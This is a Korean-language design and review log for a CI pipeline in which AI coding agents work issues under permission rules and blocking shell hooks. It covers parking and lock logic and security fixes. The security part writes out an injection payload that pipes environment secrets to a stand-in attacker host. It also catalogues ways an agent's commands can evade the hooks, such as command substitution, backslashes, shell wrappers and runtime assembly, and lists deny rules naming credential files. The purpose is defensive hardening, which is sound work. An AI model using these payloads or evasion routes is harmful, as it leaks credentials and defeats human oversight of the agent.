1. **스키마** — `implement.v1`(`factory/lib/schemas.js`)에 **선택** 필드 `harness_needed: [{file, change, why}]`.
   없는 것이 정상이고, 있으면 세 문자열을 다 갖춰야 한다. 워크플로의 `BUILD` 스키마와 builder 역할
   파일(`## Lens` 6, `## Output`, 나쁜 발견 예시)이 같은 필드를 시킨다 — "Harness change needed" 산문
   지시는 사라졌다. 요청이 없으면 필드를 **아예 싣지 않는다**(빈 배열은 이슈를 공연히 주차시킨다).
2. **이슈 하나** — `run-stage`가 검증된 implement handoff에서 비어 있지 않은 `harness_needed`를 보면
   `factory:queue` + `factory:harness` 라벨의 이슈를 **하나** 만든다(제목 `harness: <change> — for #<n>`,
   본문은 항목 표 + `Blocks: #<n>`). 제목이 dedupe 키다 — 열린 harness 이슈 중 같은 제목이 있으면
   그것을 재사용한다(rework 라운드가 같은 요청을 또 내놓아도 이슈가 쌓이지 않는다). queue 라벨 자체가
   triage의 진입 이벤트이므로 따로 dispatch하지 않는다.
3. **피처는 주차한다** — 그 이슈는 `factory:needs-info`로 간다(사유 `waiting for harness issue #<m>`).
   `needs-human`이 아니다: 무엇이 필요한지 정확히 알고 있고, 그것이 들어오면 다시 돌 수 있다.
   `blocked`도 아니다: 판정 불가가 아니라 **대기**이고, sweeper가 30분 뒤 재점화하면 안 된다.
   그래서 그래프에 엣지 하나를 더했다 — `factory:in-progress → factory:needs-info`(복귀 경로
   `needs-info → queue`는 이미 있었다). **verifier 판정보다 먼저 본다**: 위 관측이 그 이유다.
4. **복귀는 머지의 결과다** — merge 스테이지가 PR을 머지한 뒤(단계 9) 방금 머지한 이슈의 본문에서
   `Blocks: #<n>`을 읽어 그 이슈를 `needs-info → queue`로 되돌린다(사유 `harness issue #<m> merged`).
   retro가 아니라 merge인 이유: retro는 머지 N건마다 도는 학습 잡이라 "이번 머지"와 1:1이 아니고
   (경량 회차는 이 판단을 아예 하지 않는다), 차단 해제는 하네스가 들어온 **그 순간**의 사실이다.
   본문을 쓰는 쪽과 읽는 쪽이 같은 모듈(`factory/lib/harness-request.js`)이라 두 문법이 갈라질 수 없다.
   전부 best-effort다 — 머지는 이미 일어났고 되돌릴 것이 없다.
5. **하네스 이슈의 builder는 매니페스트를 쓸 수 있어야 한다** — KTB-20의 변형 경로를 그대로 쓰되,
   `ci-settings-harness.json`과 `block-dangerous.sh`의 좁힌 목록에서 `package.json`·`package-lock.json`을
   뺀다. 그러지 않으면 **하네스 이슈 안에서 데모 #2의 벽이 그대로 재현된다**: 의존성 추가가 바로 그
   이슈가 하려는 일인데 그것이 막혀 있다. `.factory/package.json`(러너 자신의 매니페스트)만은 이름으로
   다시 세워 계속 막는다 — 그것을 열면 게이트를 돌리는 런타임 자체를 바꿀 수 있다.
   **머지는 그대로 사람이다**: `package.json`은 `[protected].factory`에 남아 있어 L1이 자동 머지를
   거부하고 `needs-human`으로 넘긴다. 이 변형이 옮기는 것은 "누가 diff를 만드는가"뿐이다(KTB-20과
   같은 문장).

**fail closed 지점**: 하네스 이슈를 만들지 못하면(gh 실패) 피처를 **주차하지 않는다** — 주차는
"누군가 저 이슈를 처리하면 돌아온다"는 약속인데, 그 이슈가 없으면 이 이슈는 아무도 보지 않는
needs-info에 영원히 앉는다. 그때는 `needs-human`이다(사유에 실패 원인을 싣는다). 마찬가지로
`ensureHarnessIssue`는 열린 이슈 목록 조회가 실패하면 만들지 않고 throw한다 — 중복 이슈를 여는 것보다
사람이 보는 편이 낫다.

**영향**: `factory/lib/harness-request.js`(신규 — 제목·본문·`Blocks:` 파싱·dedupe, 순수 함수),
`factory/lib/schemas.js`(`implement.v1`의 선택 필드), `factory/lib/labels.js`(`in-progress → needs-info`
엣지), `factory/bin/run-stage.js`(implement 분기 + `ensureHarnessIssue`·`issueBody`·`transitionOther` dep),
`factory/lib/merge-stage.js`(단계 9), `templates/factory/claude/workflows/factory-implement.js`
(`BUILD.harness_needed`·규칙 8·반환), `templates/factory/claude/agents/factory-builder.md`(Lens 6·Output·예시),
`templates/factory/factory/ci-settings-harness.json`·`factory/hooks/block-dangerous.sh`(매니페스트 개방).
테스트: `harness-request.test.js`(신규 8건 — 필드 정제·제목 dedupe·본문 왕복·`parseBlocks`·이슈 하나·
fail closed·스키마), `run-stage.test.js`(4건 — 주차·재사용·생성 실패·비-implement/빈 요청),
`merge-stage.test.js`(4건 — 해제·다중 대상·best-effort·dep 없는 옛 배선), `workflows.test.js`(2건),
`hooks.test.js`·`templates.test.js`(매니페스트 개방 + `.factory/package.json`은 그대로 막힘).
스펙 §5.1 한 문단, 데모 로그 #2 행.

#### KTB-23/24 r1 — 주차는 풀려야 하고, 사슬은 생기면 안 되고, 정리는 남의 것을 건드리면 안 된다

KTB-23·24·25·26을 소스에 대고 다시 읽은 결과 네 개의 결함과 두 개의 잔손질이 나왔다. 네 개는 전부
**같은 모양**이다: 판결이 옳았지만 그 판결이 실제로 도는 경로를 하나 놓쳤다.

1. **주차가 풀리지 않았다 (CRITICAL).** KTB-23은 해제를 merge 스테이지 단계 (9)에 두었다 — 하네스
   PR을 머지한 뒤 `Blocks: #<n>`을 읽어 피처를 큐로 되돌린다. 그런데 **하네스 PR은 구성상 보호
   경로를 건드린다**(그것이 그 이슈의 존재 이유다). merge 스테이지는 단계 (3)에서 그런 PR의 자동
   머지를 거부하고 `needs-human`으로 넘기므로, 단계 (9)는 **정상 경로에서 한 줄도 실행되지 않는다.**
   같은 판결 안의 두 문장("머지는 사람이 한다" / "merge가 해제한다")이 서로를 부정하고 있었고,
   결과는 설계대로 도는 모든 하네스 이슈에서 피처가 영원히 `needs-info`에 앉는 것이다.
   **결정**: 해제의 1차 경로를 sweeper로 옮긴다(quick + cron 양쪽). 열린 `factory:needs-info` 이슈 중
   **마지막 전이의 사유**가 `waiting for harness issue #<m>`인 것만 보고(같은 라벨을 triage의 "이슈가
   모호하다"도 쓰므로, 사유가 그 둘을 가르는 유일한 기록이다 — `lastTransition`), 그 이슈가 닫혔거나
   `claude/fq-<m>` 브랜치의 PR이 머지됐으면 `needs-info → queue`로 되돌린다. 마커
   (`factory-sweeper harness-unparked`)로 한 번만, 전이보다 **먼저** 남긴다(다른 팔과 같은 계약).
   단계 (9)는 빠른 경로로 남긴다 — 팩토리가 스스로 머지할 수 있었던 드문 경우를 몇 초 일찍 푼다.
   둘은 라벨로 겹침을 피한다: (9)가 성공하면 이슈는 더 이상 needs-info가 아니라 sweeper의 조회에
   잡히지 않는다.

2. **하네스 이슈가 하네스 이슈를 불렀다 (CRITICAL).** `run-stage.js`의 implement 분기
   (`stage === "implement" && d.ensureHarnessIssue`)는 **하네스 이슈 자신에게도** 걸렸고, implement
   프롬프트는 `package.json`·`.factory/**`·`vitest.config`를 여전히 PROTECTED로 나열하며 규칙 8로
   "`harness_needed`를 채우고 STOP"을 시켰다. 즉 승격 이슈의 builder가 **자기가 열려 있는 파일을 보고
   요청서를 쓰고 멈췄고**, L1이 그 요청에서 또 하네스 이슈를 열었다 — 사슬이다. KTB-20/KTB-23이 훅
   (`FACTORY_HARNESS_ISSUE`)과 L2(`--settings`)는 갈랐지만 **프롬프트는 그 판단을 못 받았다.**
   **결정**: 세 겹으로 막는다. (a) 분기에 `&& !harnessIssue` — 하네스 이슈의 `harness_needed`는 run
   기록 한 줄로 남기고 라우팅은 평소의 verifier 경로(→ awaiting-review 또는 needs-human)에 맡긴다.
   (b) 프롬프트가 같은 판단을 받는다: `-p`의 두 번째 위치 인자(`/factory-implement <n> true|false`)를
   디스패처가 `$2`로 읽어 워크플로 args의 `harness_issue`로 넘기고, 그때 PROTECTED에서 열린 파일이
   빠지고 규칙 8이 "이 이슈가 그 요청이다 — 고쳐라. 머지는 여전히 사람이다"로 바뀐다. (c)
   spec-conformance 리뷰어의 Lens 7에 카브아웃 — `context.json`의 `issue.labels`에 `factory:harness`가
   있으면 빌드/러너 설정 변경이 diff에 있다는 **사실만으로는 reject하지 않는다**(승격 PR에 승격이
   없으면 그 이슈는 아무것도 하지 않은 것이다). 라벨은 이미 `buildContext`가 `issue` 객체째 싣고
   있었다 — 새로 더할 필드는 없었고, 계약으로 못 박는 테스트만 없었다.

3. **정리 스텝이 남의 락을 지웠다 (IMPORTANT).** `abortStage`는 소유자를 묻지 않고 `release()`를
   불렀다. 이 스텝은 claim에 **실패해** 물러난 런에서도 돌고(취소는 claim 이전에도 온다), 그때
   지워지는 것은 지금 정상적으로 돌고 있는 다른 러너의 락이다 — 락이 막으려던 바로 그 사고를 정리
   코드가 만든다. **결정**: `lib/claim.js`에 `lockHolder()`를 더해 셋으로 가른다 — 없으면
   `lock: already released`("손으로 지우라"는 줄도 내지 않는다: 지울 것이 없다), 커밋 제목의
   `runner=`가 `FACTORY_RUNNER_ID`와 같으면 지우고, 다르면 `lock: held by <other> — left alone`.
   소유자를 **읽지 못했을** 때만 예전 동작(지운다)으로 떨어진다: 고아 락은 이 스텝의 존재 이유를
   통째로 지우고, 그 경우 이 런이 주인일 가능성이 압도적이다.
   같은 자리에서 정리 스텝의 조건도 고쳤다: `if: cancelled() || failure()` → `if: always() &&
   job.status != 'success'`. 앞의 둘은 "런이 취소됐다"와 "앞 스텝이 실패했다"만 덮어서, 잡
   타임아웃·러너 소실처럼 그 어느 쪽으로도 분류되지 않는 끝맺음에서 정리가 통째로 건너뛰어진다 —
   KTB-24가 고치려던 바로 그 사고다. 린트(`aborted-cleanup-step`)가 새 문구를 요구한다.

4. **review에 재시도 엣지가 없었다 (IMPORTANT).** 위 KTB-24의 "알려진 한계"가 그것이었다.
   **결정**: `BLOCKED_RETRY.review = { origins: ["factory:awaiting-review"], hop: "factory:awaiting-review" }`,
   `ENTRY_LABELS.review`에 `factory:blocked`, sweeper의 `BLOCKED_RETRY_STAGE`에
   `awaiting-review → review` 행, 그래프에 `blocked → awaiting-review` 엣지. 다른 팔과 같은 계약이다 —
   마커로 한 번만, api-error origin만 ≤3회.
   한 가지가 더 필요했다: 그 hop은 목적 상태가 `factory:awaiting-review`라 요구조건이 "이번 런의 GREEN
   게이트 파일 + PR head 일치"인데, hop이 일어나는 자리는 런의 맨 앞이라 그 파일이 아직 없다(fresh
   checkout이고 `resetGates` 직전이다). 그대로 걸면 hop이 거부되고 이슈는 재시도 대신 곧장
   needs-human으로 밀린다 — 재시도가 성립하지 않는다. 그래서 hop 전이는 `prerequisite: true`로 건다:
   그 hop은 **이미 얻었던 라벨의 복구**이지 새 성취의 주장이 아니고(blocked-origin 마커는 **성공한**
   전이만 남긴다 — 그때 요구조건을 이미 통과했다), 이번 런의 판정은 스테이지가 다시 돌며 만든다.

5. **잔손질 넷.** (a) `factory:harness` 이슈의 dedupe 키를 제목에서 본문의 네임스페이스 마커
   `<!-- factory-harness-request for=<n> -->`로 옮겼다 — 제목은 사람이 고쳐도 되는 줄이고 builder의
   `change` 문구가 라운드마다 한 글자만 달라져도 같은 피처에 두 번째 하네스 이슈가 열렸다. 키는
   "어느 피처를 막고 있는가" 하나여야 한다. (b) 하네스 변형에서 `.factory/package-lock.json`을 다시
   막는다(훅 정규식 + `ci-settings-harness.json`) — 매니페스트만 막고 락을 열어 두면 실제로 설치되는
   코드는 여전히 바뀐다. 템플릿 파일이 아니라 열거가 못 보므로 이름으로 못 박는 테스트를 같이 뒀다.
   (c) `sweep-step-last` 린트가 이름 없는 `- uses:` 스텝도 센다 — 예전에는 `Sweep` 뒤에 붙은
   `- uses:` 한 줄이 규칙을 소리 없이 빠져나갔다. (d) quick sweep의 API 호출량을 KTB-26에 명시했다.

**영향**: `factory/lib/sweeper.js`(`sweepHarnessUnpark`·`PARKED_ON_HARNESS`·`harnessUnparkedComment`·
`BLOCKED_RETRY_STAGE`의 review 행), `factory/lib/retro/issue-comments.js`(`lastTransition`),
`factory/lib/gh.js`(`issueState`·`mergedPrForBranch`, `issueList`의 `body`), `factory/bin/sweep.js`
(`harnessSettled` 배선), `factory/lib/harness-request.js`(마커 dedupe), `factory/lib/labels.js`
(review의 ENTRY/BLOCKED_RETRY + `blocked → awaiting-review`), `factory/lib/claim.js`(`lockHolder`·
`lockRunnerOf`), `factory/bin/run-stage.js`(`stagePrompt`·하네스 가드·hop의 `prerequisite`·
`abortStage`의 소유권 판정), `factory/lib/yml-lint.js`(`ABORTED_IF`·`uses:` 스텝), `factory/lib/merge-stage.js`
(단계 9의 위치 설명), `factory/hooks/block-dangerous.sh`·`templates/factory/factory/ci-settings-harness.json`
(락파일), `templates/factory/claude/commands/factory-implement.md`(`$1`/`$2`),
`templates/factory/claude/workflows/factory-implement.js`(프롬프트 변형),
`templates/factory/claude/agents/reviewer-spec-conformance.md`(Lens 7 카브아웃),
`templates/factory/github/workflows/factory-{triage,plan,implement,review,merge}.yml`(정리 스텝 조건).
테스트: `sweeper.test.js` 6건, `run-stage.test.js` 7건, `claim.test.js` 3건, `harness-request.test.js` 2건,
`issue-comments.test.js` 1건, `yml-lint.test.js`·`templates.test.js`·`hooks.test.js`·`context.test.js`·
`workflows.test.js`·`labels.test.js` 각 1건. 스펙 §5.1, 데모 로그 #2·#15 행.

#### 최종 리뷰 (Plan 6) — MF-2 · MF-3: dispatch 입력이 주입 싱크였고, 훅의 앵커가 등록부를 반증했다

**MF-2 — `workflow_dispatch` 입력이 모든 시크릿을 든 스텝의 `run:`에 텍스트로 붙었다.**
다섯 스테이지 워크플로 전부가 `run: node .factory/bin/run-stage.js <stage> ${{ github.event.issue.number || inputs.issue }}`였다. `${{ … }}`는 셸이 보기 **전에** Actions가 치환하므로 이것은 인자 전달이 아니라 **코드 합성**이다: `inputs.issue`는 자유 문자열(`type: string`)이고, 그 스텝의 `env:`에는 `CLAUDE_CODE_OAUTH_TOKEN`·`ANTHROPIC_API_KEY`·`GH_TOKEN: FACTORY_BOT_TOKEN`이 전부 있다. `gh workflow run`을 부를 수 있는 누구든(레포 write 협력자, 유출된 CI 토큰, 봇 토큰 자신) `1; curl -sd "$(env|base64 -w0)" https://attacker.tld #`을 넣으면 세 토큰이 나간다 — **write 권한이 secret read로 승격된다**. GitHub이 일부러 갈라 둔 경계이고, KTB-8이 `workflow_dispatch`를 재점화의 주 손잡이로 만든 뒤라 이 싱크는 예외 경로가 아니라 **본선** 위에 있었다.

**결정**: 값은 스텝 `env:`의 `ISSUE`로 묶고 스크립트는 `"$ISSUE"`만 읽는다. 그 위에 가드 한 줄 — `[[ "$ISSUE" =~ ^[0-9]+$ ]] || { …; exit 1; }` — 을 `Run stage`와 `Aborted cleanup` **양쪽**에 둔다(조용히 통과시키지 않고 소리내어 죽는다). `${{ github.sha }}`·`${{ job.status }}`·`${{ github.run_id }}`는 그대로다: 공격자가 고를 수 없는 값이라 같은 종류의 위험이 아니고, 규칙을 그쪽까지 넓히면 정당한 자리를 잡아 규칙 자체가 꺼진다. `factory-sweeper.yml`은 입력이 없고 `factory-retro.yml`은 `run:` 밖에서만 `github.event`를 쓴다 — 둘 다 손대지 않았다.

**회귀 방지**: `yml-lint.js`에 `no-expression-in-run` — `run:` 블록(한 줄 형태·블록 스칼라 둘 다, 셸 주석까지 포함) 안의 `${{ inputs.` / `${{ github.event.`를 거부한다. 셸 주석을 벗기지 않는 이유: 치환은 셸보다 **먼저** 일어나므로 주석 안의 표현식도 똑같이 확장된다. 린터는 여덟 템플릿 전부에 돌고(`yml-lint.test.js`), `STAGE_RUN` 표식도 `run-stage.js <stage> "$ISSUE"`로 바뀌어 옛 모양으로 되돌리면 스테이지 규칙 네 개가 침묵하는 것이 곧 신호가 된다.

**MF-3 — 훅의 동사 앞 경계가 `(`도 백틱도 `=`도 몰랐다: 등록부가 "차단"이라고 적은 자리를 명령 치환이 그대로 걸어 나갔다.**
`block-dangerous.sh`의 열한 개 규칙과 `deny-all-writes.sh`의 `$CMD`가 전부 `(^|[;&|[:space:]])`였다. `out=$(gh pr merge $PR --squash --delete-branch)`는 `gh` 앞 글자가 `(`라 **어떤 규칙에도 걸리지 않는다**(리뷰가 훅을 실제로 실행해 확인했다). 그리고 `.claude/settings.json`의 `Bash(gh pr merge*)` deny는 **접두 매칭**이라 같은 명령을 스치지도 않는다 — 즉 builder가 리뷰되지 않은 자기 PR을 스스로 머지할 수 있었고, 그 머지는 run 기록에도 남지 않는다(KTB-14의 백스톱은 no-write 스테이지의 워크트리 diff만 본다 — `gh` 머지는 둘 다 건드리지 않는다). 같은 구멍이 락 브랜치 삭제·`factory:*` 라벨 조작·docker teardown에도 그대로 났다. **이것은 잔여 위험 #4(경로 난독화)가 아니다**: 동사가 눈앞에 그대로 있는데 규칙이 빗나갔고, 등록부는 그 자리를 "차단"이라고 적고 있었다 — 코드가 등록부를 반증했다.

**결정**:
- 앞 경계를 **토큰 경계**로 넓힌다: 줄 시작 · 공백 · `(` · 백틱 · `;` · `&` · `|` · `=` · `{`. 뒤 경계도 같은 집합으로(`$(docker compose down)`의 `down` 뒤는 `)`다) — 앞만 고치면 한 앵커를 고치고 다른 앵커에 같은 구멍을 남긴다. 두 훅이 같은 변수(`$A`/`$CMD`, `$Z`/`$ZE`)를 쓴다.
- 락 브랜치 삭제의 **세 철자**를 다 본다: `--delete … factory/lock-N` · `:refs/heads/factory/lock-N` · `:factory/lock-N`.
- **브랜치 보호·룰셋** 규칙을 새로 세운다(SF-2): `gh api …/branches/*/protection` · `gh api …/rulesets` · `gh ruleset`, **메서드 철자 불문**. 철자를 하나씩 쫓는 것(`-X PUT` vs `--method PUT` vs `-XPUT`)은 진 싸움이고, 모든 스테이지 env에 `GH_TOKEN=FACTORY_BOT_TOKEN`이 있는 이상 `required_status_checks`/`enforce_admins`를 끄는 것은 L0 자체를 끄는 일이다(그리고 아무 라벨도 코멘트도 나지 않는다). GET까지 막히는 오탐은 손실이 없다 — 보호 설정을 읽어야 하는 역할이 없다.
- `ln`·`chmod`를 builder의 보호 경로 규칙에 더한다(SF-3): 둘 다 파일을 **쓰지 않고** 그 파일이 하는 일을 바꾼다(`ln -sf /tmp/evil .claude/settings.json`, `chmod -x .factory/bin/gates.js`). `mkdir`·`touch`는 더하지 않고 **등록부 표를 사실에 맞췄다** — 기존 파일의 내용도 동작도 바꾸지 못한다.
- 등록부 표 위에 읽는 법을 못 박았다: **L2 deny는 이 표의 근거가 아니다**(접두 매칭이라 `$( … )`·체인 안에서는 무력하다). 실제 경계는 훅이다. (그때 함께 적은 "명령의 **어느 자리에 있든** 차단"은 **재리뷰에서 철회했다** — 아래.)

**테스트**: `hooks.test.js`에 표 기반 두 쌍 — 위험 동사 21개 × 회피형 9가지(`out=$(…)`·`$(…)`·백틱·`;`·`&&`·`||`·`{ …; }`·파이프·`\`)를 전부 exit 2로 고정하고, 같은 글자들이 무해한 자리에 있는 정상 명령(`out=$(git status)`·`npm test && git commit`·`chmod +x scripts/run.sh`·`grep -rn "git merge" docs/`)은 exit 0으로 고정한다.

**재리뷰(0452b5b) — 토큰 경계를 고친 뒤에도 남아 있던 네 자리, 그리고 등록부의 과대주장 한 줄.**
재리뷰는 훅을 **실제로 실행해** 네 가지를 통과시켰다. 넷 다 동사가 명령줄에 그대로 있다(런타임 조립이 아니다) — 즉 MF-3과 **같은 고장이 한 단계 좁은 자리에서** 반복된 것이다.

- **#1 백슬래시 이스케이프**: `\gh pr merge 5` · `\git push --force origin main` · `\rm -rf .factory/lib`. bash에서 `\`는 alias 확장만 끄고 동사를 그대로 실행하는데 경계 클래스에 `\`가 없었다. → 두 훅의 경계(`$A`/`$CMD`) 끝에 `\\?`를 붙였다. **따옴표는 넣지 않았다**: `grep -rn "git merge" docs/`·`git log --grep="git merge"`가 그 순간 오탐이 되고, 둘 다 정상 작업으로 고정돼 있다.
- **#2 락 브랜치 삭제의 네 번째 철자**: `gh api -X DELETE …/git/refs/heads/factory/lock-7`. 앞의 세 철자는 전부 `git push`를 가정했다. 락 브랜치는 이슈 단위 상호배제의 **유일한** 근거이므로 문이 하나라도 열려 있으면 같은 이슈에 두 스테이지가 겹친다. → `gh api …/git/refs/heads/factory/lock` 규칙(브랜치 보호 규칙과 같은 이유로 **메서드 철자·호스트 접두 불문**). 읽기(GET)까지 막히는 오탐은 손실이 없다 — 락 상태는 `git ls-remote`로 본다.
- **#3 레포 단위 라벨 조작**: `gh label delete|edit|create factory:*` · `gh label clone` · `gh api …/labels/factory:*` · `POST …/labels` 본문의 `factory:`. 이슈 한 건의 라벨만 막고 있었는데, 레포에서 라벨을 지우면 **모든 이슈에서 한 번에** 떨어진다 — 더 큰 우회였다. `gh label list`·`--search`는 읽기라 그대로 통과한다.
- **#4 인터프리터 래퍼 / ANSI-C 인용**: `sh -c "gh pr merge 5"` · `bash -c '…'` · `eval "…"` · `$'gh' pr merge 5`. 재리뷰가 확인한 대로 이 저장소의 allow는 `Bash(*)`이고 `ci-settings*.json` 어디에도 `sh`/`bash`/`eval`/`python`/`node` deny가 없다 — "래퍼는 allow가 막는다"는 전제는 **거짓**이었고 훅이 유일한 층이다. → 규칙 표를 함수(`scan`)로 묶고, 명령 위치에 `sh|bash|zsh|dash|ksh|eval|exec|source|.`가 보이거나 `$'…'`/`$"…"`가 보이면 **따옴표를 벗긴 사본**에 같은 표를 한 번 더 돌린다(그 패스에서만 경계에 `$`를 더한다 — `$'gh'`가 `$gh`가 되므로). 표를 두 벌 만들지 않은 이유는 명백하다: 두 벌이면 반드시 한쪽이 뒤처진다.
- **등록부의 과대주장**: "이 표의 '차단'은 **명령의 어느 자리에 있든** 차단"은 코드보다 강한 문장이었다(위 네 자리가 반례다). 읽는 법을 **덮는 자리의 열거**(토큰 경계 · 백슬래시 · 명령 위치 접두사 · 래퍼/ANSI-C 인용)와 **덮지 않는 자리의 열거**(런타임 조립 — 잔여 위험 #4)로 바꿨다. 등록부가 코드를 앞서가지 않게 하는 것이 MF-3이 제기된 이유 자체다.

**비목표를 코드가 아니라 테스트로 고정한다**: 런타임 조립(`x=$(printf "gh pr merge 5"); $x` · `"$(printf gh) pr merge"` · `python3 -c "os.system('…')"` · `node -e "execSync('…')"`)은 `hooks.test.js`에서 **exit 0으로 고정**한다. "아직 안 막았다"와 "막지 않기로 했다"는 다르고, 뒤쪽만이 리뷰 가능한 결정이다.

**하지 않은 것 — SF-1의 `persist-credentials: false` (알려진 한계)**: 스테이지의 `git push`는 **그 persisted credential로 나간다**. `claim.js`(락 브랜치 claim/release)와 `records-branch.js`(run 기록)는 `git push origin …`을 인자 없이 부르고, 토큰이 들어오는 경로는 `actions/checkout`이 심는 `http.extraheader` 하나뿐이다(`run-stage.js`의 `truncateReason` 주석이 이미 그 배선을 근거로 쓰여 있다 — 명시적 토큰 remote도 `gh auth setup-git`도 없다). 그래서 `persist-credentials: false`를 지금 켜면 **락 claim이 첫 push에서 죽는다** = 모든 스테이지가 멈춘다. 남는 노출은 이것이다: `.git/config`에 base64 토큰 헤더가 있고, 그 트리를 `Bash(*)`를 가진 builder가 읽을 수 있으며, 아티팩트는 `retention-days` 없이(90일 기본) 레포 read 권한자 누구나 받는다. 닫으려면 push 경로를 **명시적 토큰**(`git push https://x-access-token:$FACTORY_BOT_TOKEN@…` 또는 `gh auth setup-git`)으로 옮기고 그 뒤에 `persist-credentials: false` + 업로드 전 `.git/config` 스크럽 + `retention-days: 7`을 한꺼번에 거는 것이 맞다 — 그건 이 라운드의 범위(리뷰가 판정한 네 개의 must-fix)를 넘는 배선 변경이라 다음 라운드로 넘긴다.

**보강 — SF-1의 나머지 절반을 지금 건다 (최종 리뷰 should-fix, 0452b5b 다음 커밋)**: 위 문단은 `persist-credentials: false`만 판정했고, **그 외의 세 가지는 배선 변경 없이 지금 걸 수 있다**는 사실을 함께 미뤘다. 토큰이 트리에 남는 것은 어쩔 수 없어도, 그것이 **공개 아티팩트로 90일 나가는 것**은 별개의 결정이다.

- **① 업로드 직전 스크럽** — `factory/bin/scrub-artifacts.js`(의존성 0, `factory init`이 `.factory/bin/`으로 복사)를 업로드하는 여섯 워크플로 전부가 업로드 **바로 앞** 스텝에서 부른다(`if: always()` — 사후 조사가 가장 필요한 런은 실패한 런이고, 크리덴셜은 그 런의 아티팩트에도 똑같이 있다). 올라갈 경로(run 기록 · `.factory/out/` · 세션 트랜스크립트) 아래 **모든 텍스트 파일**에서 지운다: (a) `AUTHORIZATION: basic <base64>` · `Authorization: Bearer …`의 **값**(헤더 이름은 남긴다 — 무엇이 지워졌는지 읽을 수 있어야 사후 조사가 된다), (b) `ghp_`·`gho_`·`ghu_`·`ghs_`·`ghr_`·`github_pat_`, (c) `sk-ant-…`, (d) 스텝 `env:`로 들어온 `FACTORY_BOT_TOKEN`·`CLAUDE_CODE_OAUTH_TOKEN`·`ANTHROPIC_API_KEY`·`GITHUB_TOKEN`의 **리터럴 값**, (e) 그 값들의 `x-access-token:<token>` base64(= git이 심는 헤더의 그 형태). 전부 `[REDACTED:<kind>]`이고, **로그에는 종류별 개수만** 찍는다 — 값을 로그에 적으면 스크럽 자신이 유출 경로가 된다(런 로그는 아티팩트보다 넓게 읽힌다). 바이너리(앞 8000바이트에 NUL — git의 휴리스틱)는 한 바이트도 건드리지 않는다. 멱등이다(마커의 `[`가 어느 값 문자 클래스에도 없다). 리터럴 치환에는 **길이 하한 12**가 있다: `GITHUB_TOKEN=x` 같은 값을 그대로 치환하면 파일에서 모든 `x`가 사라져 아티팩트를 지키려다 아티팩트를 망가뜨린다(그 경우 건드리지 않고 개수만 보고한다).
- **② `retention-days: 7`** — 여섯 템플릿의 모든 `upload-artifact`에 적었고, 새 린트 규칙 `artifact-retention`이 **명시된 1–14** 값을 요구한다(값을 읽을 수 없는 표현식도 위반이다 — `${{ vars.X }}`가 비면 조용히 90일로 돌아간다). 스크럽이 1차 방어라면 이 값은 2차다: 스크럽이 모르는 모양이 있어도 노출 창이 7일로 닫힌다.
  - **KTB-34 (2026-09-14, own-calendar 브라운필드 실측)**: ADR-021 r1 MF-2 d가 merge-token-scope를 보려고 `checkWorkflows`를 저장소의 `.yml` 전부로 넓히면서, 이 규칙(그리고 `no-expression-in-run`·`runner-id-consistent`·sweep-list 규칙들)도 함께 따라가 입양자 자신의 `build.yml`(앱 빌드 아티팩트 업로드)에 `artifact-retention` FAIL을 냈다 — 팩토리가 요구할 근거가 없는 파일이었다. 판결: 이 규칙들은 `scope: "factory"`로 `factory-*.yml`(팩토리 소유 워크플로)에만 걸고, `merge-token-scope`만 `scope: "repo"`로 모든 파일에 남긴다(`factory/lib/yml-lint.js`).
- **③ 크리덴셜 파일 읽기 deny** — `ci-settings.json`과 `ci-settings-harness.json` 양쪽에 `Read(.git/config)`·`Read(.git/**)`·`Read(**/.netrc)`·`Read(**/.npmrc)`를 더했다. 애초에 읽지 않게 하는 첫 방어다.

**여전히 남는 것(정직하게)**: 토큰은 **잡이 사는 동안 체크아웃 트리 안에 그대로 있다** — `persist-credentials: false`는 위 문단의 이유로 아직 켤 수 없고, 그 토큰으로 할 수 있는 일에는 아무 변화가 없다. ③의 `Read(...)` deny는 **Read 툴만** 막는다: `Bash(cat .git/config)`·`git config --get-regexp http.*`·`env` 덤프는 그대로 가능하고(L2 deny는 접두 매칭이며 훅은 *쓰기* 동사를 본다), 그 출력이 트랜스크립트에 실리면 ①의 (a)·(d)·(e)가 그것을 지운다 — 그러나 스크럽은 **모양을 아는 것만** 지운다: 새 토큰 접두사, 에이전트가 스스로 인코딩한 형태(예: 토큰을 잘라 붙이거나 hex로 바꾼 출력)는 놓친다. 즉 이 라운드가 닫은 것은 **사고성 유출과 노출 기간**이고, **의도적 유출**은 여전히 열려 있다. 그 문은 push 경로를 명시적 토큰으로 옮기고 `persist-credentials: false`를 켤 때 닫힌다.

**영향**: `templates/factory/github/workflows/factory-{triage,plan,implement,review,merge,retro}.yml`, 새 `factory/bin/scrub-artifacts.js`, `factory/lib/yml-lint.js`, `factory/hooks/block-dangerous.sh`, `factory/hooks/deny-all-writes.sh`, `templates/factory/factory/ci-settings{,-harness}.json`, `factory/test/scrub-artifacts.test.js`(신규)·`yml-lint.test.js`·`templates.test.js`·`hooks.test.js`, 스펙 §4.1, 이 문서의 잔여 위험 등록부.

#### KTB-36 — qa는 증거를 남기라는 명령을 받았고, L2는 그 디렉터리를 막고 있었다 (deny가 allow를 이긴다)

**관측**(라이브, KTB 자기 자신 #3 — implement R3 뒤의 review, 그리고 그 라운드가 연 하네스 이슈 #7):
`reviewer-spec-conformance`가 매 라운드 같은 이유로 거부했다 — `.factory/out/qa/**`에 qa 리뷰어의
산출물이 **하나도 없다**. 그런데 qa는 게으르지 않았다: 그 역할 파일이 증거를 정확히 그 디렉터리에
남기라고 **명령하고** 있고(`reviewer-qa.md:33`, `harness.toml [evidence].qa_artifacts =
".factory/out/qa/**"`), 두 훅은 F3에서 그 디렉터리를 이미 카브아웃해 두었다
(`deny-all-writes.sh`의 `QA_DIR`, `block-dangerous.sh`의 `qa` 토큰 지우기).

**무엇이 어긋났나**: 모든 스테이지는 `--settings .factory/ci-settings.json`으로 L2를 받는다
(`run-stage.js`). 그 파일의 deny에는 `Edit(.factory/**)`·`Write(.factory/**)` **한 줄**이 있었고,
그 한 줄이 증거 디렉터리까지 덮었다. **Claude Code에서 deny는 allow를 이긴다** — 그래서 이 카브아웃은
allow에 `Write(.factory/out/qa/**)`를 더해도 **만들 수 없다**(KTB-13이 같은 문장을 반대 방향으로
확인했다: "넓어진 것은 부여이지 방벽이 아니다"). 세 곳(역할 프롬프트·훅·harness.toml `[protected].except`)이
전부 "여기는 열려 있다"고 적어 두었는데 L2 한 줄이 조용히 그 셋을 무효로 만들고 있었고, 증상은
qa가 아니라 **spec-conformance의 거부**로 나타났다 — 원인에서 가장 먼 자리다.

**결정**: `.factory/`의 통짜 deny를 **열거**로 바꾼다(`ci-settings.json`·`ci-settings-harness.json` 양쪽).
